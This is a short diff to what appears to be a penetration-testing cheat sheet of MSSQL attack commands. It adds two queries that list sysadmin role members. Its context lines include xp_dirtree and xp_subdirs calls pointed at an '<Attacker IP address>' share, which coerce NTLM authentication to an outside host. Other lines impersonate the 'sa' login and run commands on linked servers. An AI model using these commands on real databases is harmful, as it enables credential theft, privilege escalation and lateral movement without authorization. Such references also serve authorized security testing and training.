@@ -409,6 +409,8 @@ SQL> EXEC master..xp_dirtree '\\<Attacker IP address>\share\'
 SQL> EXEC master..xp_subdirs '\\<Attacker IP address>\share\'
 SQL> SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
 SQL> SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
+SQL> SELECT IS_SRVROLEMEMBER('sysadmin', '<username>');
+SQL> SELECT sp.name FROM sys.server_principals sp JOIN sys.server_role_members srm ON sp.principal_id = srm.member_principal_id JOIN sys.server_principals rp ON srm.role_principal_id = rp.principal_id WHERE rp.name = 'sysadmin';
 SQL> USE master; EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')
 SQL> SELECT srvname, isremote FROM sysservers
 SQL> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<IP address>\SQLEXPRESS]
